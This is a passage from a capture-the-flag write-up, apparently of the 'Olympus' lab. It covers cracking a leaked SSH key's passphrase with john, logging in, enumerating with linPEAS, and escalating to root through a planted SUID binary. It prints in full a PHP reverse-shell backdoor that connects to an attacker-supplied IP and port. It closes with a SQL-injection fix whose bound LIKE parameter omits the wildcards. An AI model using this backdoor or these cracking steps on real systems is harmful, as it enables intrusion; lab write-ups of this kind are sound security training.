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
eRZjPBIy1rjIUiWe6LS1ToEyqfY=
-----END OPENSSH PRIVATE KEY-----
```

Ok, so let's copy this key inside my machine  and run ssh2john to creat a good hash for john:
```bash 
ssh2john id_rsa > ssh_hash
```
```bash
cat ssh_hash 
id_rsa:$sshng$6$16$0bafe08e57635a6dd91f469db7f167cc$1910$6f70656e7373682d6b65792d7631000000000a6165733235362d6374720000000662637279707400000018000000100bafe08e57635a6dd91f469db7f167cc000000100000000100000197000000077373682d727361000000030100010000018100a1ba375d517da2590f89ee7f8f5fab1733f300f9fa1922f7aa6ebfafe3445ba816365c56b7399d3511e4db919fe0fd1aadd12aa59b5377f025228b67a8c382a4d0dd8b4c01ed3b335decf9e7bd0753dcd7490cacf96d48335c4ee608526465739c76bc875b2ba390640a8b948b74bb21bcdce369bc71abd3fa1d2235448e26ddcd7a344ef261a4d0f4b5ff2aab5c747732928c582378e768047532fd3b2a2764f7678c30f46fcfac57f112480b8f61e5c052e0989975eba3f31609f8c83643282a6b130ed96e20849b94e8f4c7ef711f3381b47ad2a2d7fb59476d92bccd61760e87e497a82cd893a55c8e4916127d988195d3d0e78ff8bd4e753af735f41fdb586947de35fce00f4524fb9a63a8ea6220cc607d3875cd66dc7b2e333c2adeb9d5733002a1edacf13eedfd5015e1752758ad18da10a3a52b6dbe583b35129248ca065e5b5aaace3412cea6d583505f2abc22d2cbca4398ebaf04dd7f4acb2d9df37c0a4ee2d38505264ed28756a40e0d239215302e910ca500325e8d1920bb910000059055d9a4ddb5f5bb2b11dbc45068d96bd2dcabb92426509fb32c18b0b62bb3d1883ac47481450a12bc3a7e2ecf5e8b81db04b66aa1e9a4ff8b48ece18d3d1bbfaf0a664ec8ad5ddea5c0c513d27396097136f15325e604b56c9bf590097ff0bb69b5ea994ee80da535dac1c9c13399f05792fcf8079f22280c547e4be8e79b74132887c9bc8fbf003c4b935ac43e3e3eeccffa58337641841089456915fdff1d8b6f8f3071d9fd063b73796fad494cb906f6d28f2386c9663e1d0c86936dabe7de3321888a998458b7febab71f54759914e6cae79885801548d4b171372d232822fc63f2ab1502242ca21af06c07cb2e0dd405e6d22b818125ce74c6150a500386e42471d361983c7d501c8168ee830bb33da545ce6ea01147d06d7e0d19a2a6a8750f82bb160a142f981ce5f07b5cb4f4dc800a2186ac103b417ae5afe832bc016ed79a1e0004f508ab26971db12f57d710c87135c51876dba217949472ef97634d611257ddd2b0aaefbf3ea0def7608403f4a3c1ecc58c23cf907dc7de10b151bc0966a71a70c8536b535f99e47489e779c2d28ee112127537bc6a8a20fa4800cbe9a36a5a08dfca55b2e67e573d3edde60a373903decfb8d12243e7be3266b34e99d5de4af25b37b92630a1a9d0439425443571648aa6c9d1ea9cf29551cfa96aea169359a5ace219ee77394a8ad2eeedc46c98165e2b95167f1fab4e1dfd2c4150927380e55b5ba0648cb13b2891a476cb27c4198b6a526a9dd855b39b0a193d30a355fb10945a70c25e2ce727fbbfaa6a45ac0a64b05d22fc174a1774302b12f6a8e92a910a9b28284d8b6f2d9b3a593ff6077535343694bacd8f675a45c4f75874ab4ba460d30c358c1b5ac16003755f76e3cf90e5faa16b2cece423eb569655869f6bdf51c9fd0bd0f732f448b3f1e35e90fd2e65849410bffab45cec1b98a59c0d8902be0ddd8a517876bbe03725c8a30e3af96c4d71b8f5e384ae41bc209417aa10a7121c7e8452efd82db378c3f459859973c8b6f83ff179f3bdb8377d1a998fc5b839b72c6b84359adf673b0d061b3ea5db5e3526ee54ed5014f015320de4aff08ab2c9639a1ccbdc2cce35d8563479367c7a006783c6789de6c60d4b3ebb2942e0ac6e1d6658231fe5759050ad70da6b67955069230be7c9c9fba3aa0c6db8c7cab29eb410b1bb4b084eed349ae5b9389199e6ff3662217ef84a445efcc80b49f4926e9d752f6b3e0171af71498e3b1885a183fc82ede203bcd6bd81a9dfcad6e8d9e312a8a68c322e4f03165277da2d55b8e4c6c4ed2a1594bd0809d3191503c1b53e2b7df3a93f7650f6909e900be6c3c18c614fe0f9efaf912a5b6f69de8edd25e7c77d93f4d61aaaaac42743e047c0ab4c676c3ae6f008c4924c784f806c3f11fa22d738c7261981f07f277dd997e0857830039bc0c64148f14868eddbd49e88023f884d3344f377e95705c97bca3ab25c484d2968403cf367f3fe7ed0d1669e79298bda8f97e68dc7f8fda9de3f58c7c02a611d49ed391df69c5acea5b39af0dddf524a53510b1159834a8838cd9810337f312a9f07576c297eed6e1c59c3691326a61d32eab5cf339872da4b4188b274b2c798cc2ebe06288b219403270c649c1d66117b5f2f9f3202a624244a66fbc5489396a0503f319702a000fbb62a7d8f4e43584e59e58ea37b5f2446cd9c5f2ea354d9a8e9e932900b2c36db433c97cbed52e84c471ca4cbfa2eb671bf8cf3cce5a6a3e3e044788646985b4a1d5b874a73daf5acfcafdfd204e41ef3e0994d8ad765f081d56a32c3320fc7771d80c8c413e62bcf3d56c2083b8d5aae9a5078e683ba6656b7dddd65d4dd14001350561c12d16178d4eb5a7891099ed7c308052044549aabeec4233ed22bff871fd9028a1babbd95bf5fb7acd05eca37ac226e8aecb8600c1036100f6145778980a0da197699f2ab0961b0a5e0ed338528509cc5dd7bcef97916633c1232d6b8c852259ee8b4b54e8132a9f6$16$486
```


---

### JOHN
Now we can crack it with john to find the passphrase :
```bash
john ssh_hash       
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
...
Proceeding with wordlist:/usr/share/john/password.lst
snowflake        (id_rsa)     
...
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
We just found the passphrase for the private ssh key :
**snowflake**

---
## SSH ZEUS user
Now we can try to connect to the ssh with this private key:
- put the id_rsa file key in ~/.ssh/
- chmod 600 the id_rsa 
- connect with key and the passphrase :
```bash
ssh zeus@olympus.thm -i /home/freekali/.ssh/THM_olympus_id_rsa
Enter passphrase for key '/home/freekali/.ssh/THM_olympus_id_rsa': 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 01 Mar 2023 02:15:30 PM UTC

  System load:  0.0               Processes:             128
  Usage of /:   44.4% of 9.78GB   Users logged in:       0
  Memory usage: 70%               IPv4 address for eth0: 10.10.207.20
  Swap usage:   0%

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

33 updates can be applied immediately.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Sat Jul 16 07:52:39 2022
zeus@olympus:~$ 
```

## ROOT PRIVESC

We can try to download linPEAS.sh to enumerate :
- download linpeas.sh https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
- create python3 http.server : ```python3 -m http.server 9090```
- download the script in the target machine : ```wget http://YOURIP:9090/linpeas.sh```
- run linpeas.sh:
```bash
...
                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════
                               ╚═══════════════════╝
OS: Linux version 5.4.0-109-generic (buildd@ubuntu) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)) #123-Ubuntu SMP Fri Apr 8 09:10:54 UTC 2022
User & Groups: uid=1000(zeus) gid=1000(zeus) groups=1000(zeus),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)
Hostname: olympus
Writable folder: /dev/shm
[+] /usr/bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /usr/bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)
[+] /usr/bin/nc is available for network discovery & port scanning (linpeas can discover hosts and scan ports, learn more with -h)



Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE

                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════
                              ╚════════════════════╝
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits
Linux version 5.4.0-109-generic (buildd@ubuntu) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)) #123-Ubuntu SMP Fri Apr 8 09:10:54 UTC 2022
Distributor ID:	Ubuntu
Description:	Ubuntu 20.04.4 LTS
Release:	20.04
Codename:	focal

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version
Sudo version 1.8.31

╔══════════╣ CVEs Check
Vulnerable to CVE-2021-3560

Potentially Vulnerable to CVE-2022-2588

...
                               ╔═══════════════════╗
═══════════════════════════════╣ Users Information ╠═══════════════════════════════
                               ╚═══════════════════╝
╔══════════╣ My user
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users
uid=1000(zeus) gid=1000(zeus) groups=1000(zeus),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg
netpgpkeys Not Found
netpgp Not Found

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
Sorry, try again.

╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens
ptrace protection is enabled (1)
gdb wasn't found in PATH, this might still be vulnerable but linpeas won't be able to check it

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2

[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

...

```

We have find an interesting file **'VIGQFQFMYOST.php'** :
```bash
zeus@olympus:/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc$ cat VIGQFQFMYOST.php 
<?php
$pass = "a7c5ffcf139742f52a5267c4a0674129";
if(!isset($_POST["password"]) || $_POST["password"] != $pass) die('<form name="auth" method="POST">Password: <input type="password" name="password" /></form>');

set_time_limit(0);

$host = htmlspecialchars("$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]", ENT_QUOTES, "UTF-8");
if(!isset($_GET["ip"]) || !isset($_GET["port"])) die("<h2><i>snodew reverse root shell backdoor</i></h2><h3>Usage:</h3>Locally: nc -vlp [port]</br>Remote: $host?ip=[destination of listener]&port=[listening port]");
$ip = $_GET["ip"]; $port = $_GET["port"];

$write_a = null;
$error_a = null;

$suid_bd = "/lib/defended/libc.so.99";
$shell = "uname -a; w; $suid_bd";

chdir("/"); umask(0);
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if(!$sock) die("couldn't open socket");

$fdspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
$proc = proc_open($shell, $fdspec, $pipes);

if(!is_resource($proc)) die();

for($x=0;$x<=2;$x++) stream_set_blocking($pipes[x], 0);
stream_set_blocking($sock, 0);

while(1)
{
    if(feof($sock) || feof($pipes[1])) break;
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
    if(in_array($sock, $read_a)) { $i = fread($sock, 1400); fwrite($pipes[0], $i); }
    if(in_array($pipes[1], $read_a)) { $i = fread($pipes[1], 1400); fwrite($sock, $i); }
    if(in_array($pipes[2], $read_a)) { $i = fread($pipes[2], 1400); fwrite($sock, $i); }
}

fclose($sock);
for($x=0;$x<=2;$x++) fclose($pipes[x]);
proc_close($proc);
```
Ok, this  **backdoor**, but we can't use it with curl. the backdoor use ```/lib/defended/libc.so.99``` to get root, so we can try it :

```bash
zeus@olympus:/$ ./lib/defended/libc.so.99
$ id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),1000(zeus)
$ ls 
bin  boot  dev	etc  home  lib	lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  snap	srv  sys  tmp  usr  var
$ cd root
$ ls
config	root.flag  snap
$ cat root.flag	
                    ### Congrats !! ###




                            (
                .            )        )
                         (  (|              .
                     )   )\/ ( ( (
             *  (   ((  /     ))\))  (  )    )
           (     \   )\(          |  ))( )  (|
           >)     ))/   |          )/  \((  ) \
           (     (      .        -.     V )/   )(    (
            \   /     .   \            .       \))   ))
              )(      (  | |   )            .    (  /
             )(    ,'))     \ /          \( `.    )
             (\>  ,'/__      ))            __`.  /
            ( \   | /  ___   ( \/     ___   \ | ( (
             \.)  |/  /   \__      __/   \   \|  ))
            .  \. |>  \      | __ |      /   <|  /
                 )/    \____/ :..: \____/     \ <
          )   \ (|__  .      / ;: \          __| )  (
         ((    )\)  ~--_     --  --      _--~    /  ))
          \    (    |  ||               ||  |   (  /
                \.  |  ||_             _||  |  /
                  > :  |  ~V+-I_I_I-+V~  |  : (.
                 (  \:  T\   _     _   /T  : ./
                  \  :    T^T T-+-T T^T    ;<
                   \..`_       -+-       _'  )
                      . `--=.._____..=--'. ./          




                You did it, you defeated the gods.
                        Hope you had fun !



                   flag{D4mN!_Y0u_G0T_m3_:)_}




PS : Prometheus left a hidden flag, try and find it ! I recommend logging as root over ssh to look for it ;)

                  (Hint : regex can be usefull)
```



# ROOTED

```bash
$ grep -rni "flag{" /etc/
/etc/ssl/private/.b0nus.fl4g:3:flag{Y0u_G0t_m3_g00d!}
/etc/ssl/private/.b0nus.fl4g:8:grep -irl flag{
$ cat /etc/ssl/private/.b0nus.fl4g
Here is the final flag ! Congrats !

flag{Y0u_G0t_m3_g00d!}


As a reminder, here is a usefull regex :

grep -irl flag{




Hope you liked the room ;)

```


---
# FIX 
## search.php
```php
<!-- @author 'Victor Alagwu';
//   @project 'Simple Content Management System';
//   @date    '0ctober 2016'; -->
<?php include 'includes/header.php';?>
        <!-- Navigation Bar -->
   <?php include 'includes/navbar.php';?>
        <!-- Navigation Bar -->

    <div class="container">
        <div class="row">
	        <!-- Page Content -->
	        <div class="col-md-8">
            <h1 class="page-header">Heading<small>Secondary Text</small></h1>
            <?php
if (isset($_POST['submit'])) {
	$search = $_POST["search"];

	$query = "SELECT * FROM posts WHERE post_tags LIKE '%$search%' AND post_status='publish'";
	$search_query = mysqli_query($con, $query);
	if (!$search_query) {
		die("Query Fail" . mysqli_error($con));
	}
	$count = mysqli_num_rows($search_query);
	if ($count == 0) {
		echo "<h1>No result</h1>";
	} else {
		while ($row = mysqli_fetch_assoc($search_query)) {
			$post_title = $row['post_title'];
			$post_id = $row['post_id'];
			$post_category_id = $row['post_category_id'];
			$post_author = $row['post_author'];
			$post_date = $row['post_date'];
			$post_image = $row['post_image'];
			$post_content = $row['post_content'];
			$post_tags = $row['post_tags'];
			$post_comment_count = $row['post_comment_count'];
			$post_status = $row['post_status'];
			?>
		<!-- Post Area-->

	        	<p><h2><a href="#"><?php echo $post_title; ?></a></h2></p>
	        	<p><h3>by <a href="#"><?php echo $post_author; ?></a></h3></p>
	        	<p><span class="glyphicon glyphicon-time"></span>Posted on <?php echo $post_date; ?></p>
	        	<hr>
	        	<img class="img-responsive img-rounded" src="img/<?php echo $post_image; ?>" alt="900 * 300">
	        	<hr>
	        	<p><?php echo substr($post_content, 0, 300) . '.........'; ?></p>
	        		<a href="post.php?post=<?php echo $post_id; ?>"><button type="button" class="btn btn-primary">Read More<span class="glyphicon glyphicon-chevron-right"></span></button></a>
	        	<hr>
	        	<!-- Post Area -->
	        	<?php }
	}
}
?>





	        	<hr>
	        	<ul class="pager">
				  <li class="previous"><a href="#"><span class="glyphicon glyphicon-arrow-left"></span> Older</a></li>
				  <li class="next"><a href="#">Newer <span class="glyphicon glyphicon-arrow-right"></span></a></li>
				</ul>
	        </div>
	        <!-- Page Content -->
	        <!-- Side Content -->
	        <div class="col-md-4">

               <?php include 'includes/sidebar.php';
?>

	        </div>
	        <!-- Sde Content -->
        </div>

        <!-- Footer -->
        <?php include 'includes/footer.php';?>
        <!-- Footer -->
    </div>
  <script src="js/jquery.js"></script>
  <script src="js/bootstrap.min.js"></script>

</body>
</html>
```
To protect against SQL injection in this script, you should use **prepared statements** with parameterized queries instead of directly concatenating user input into the SQL query.

This is a possible correction to the **search.php** with **prepared statements**:
```php
<?php include 'includes/header.php';?>
<!-- Navigation Bar -->
<?php include 'includes/navbar.php';?>
<!-- Navigation Bar -->

<div class="container">
    <div class="row">
        <!-- Page Content -->
        <div class="col-md-8">
            <h1 class="page-header">Heading<small>Secondary Text</small></h1>
            <?php
            if (isset($_POST['submit'])) {
                $search = $_POST["search"];

                $query = "SELECT * FROM posts WHERE post_tags LIKE ? AND post_status='publish'";
                $stmt = mysqli_prepare($con, $query);
                mysqli_stmt_bind_param($stmt, "s", $search);
                mysqli_stmt_execute($stmt);
                $search_query = mysqli_stmt_get_result($stmt);
                if (!$search_query) {
                    die("Query Fail" . mysqli_error($con));
                }
                $count = mysqli_num_rows($search_query);
                if ($count == 0) {
                    echo "<h1>No result</h1>";
                } else {
                    while ($row = mysqli_fetch_assoc($search_query)) {
                        $post_title = $row['post_title'];
                        $post_id = $row['post_id'];
                        $post_category_id = $row['post_category_id'];
                        $post_author = $row['post_author'];
                        $post_date = $row['post_date'];
                        $post_image = $row['post_image'];
                        $post_content = $row['post_content'];
                        $post_tags = $row['post_tags'];
                        $post_comment_count = $row['post_comment_count'];
                        $post_status = $row['post_status'];
            ?>
                        <!-- Post Area-->

                        <p><h2><a href="#"><?php echo $post_title; ?></a></h2></p>
                        <p><h3>by <a href="#"><?php echo $post_author; ?></a></h3></p>
                        <p><span class="glyphicon glyphicon-time"></span>Posted on <?php echo $post_date; ?></p>
                        <hr>
                        <img class="img-responsive img-rounded" src="img/<?php echo $post_image; ?>" alt="900 * 300">
                        <hr>
                        <p><?php echo substr($post_content, 0, 300) . '.........'; ?></p>
                        <a href="post.php?post=<?php echo $post_id; ?>"><button type="button" class="btn btn-primary">Read More<span class="glyphicon glyphicon-chevron-right"></span></button></a>
                        <hr>
                        <!-- Post Area -->
            <?php
                    }
                }
            }
            ?>
```


---
# Thanks for reading 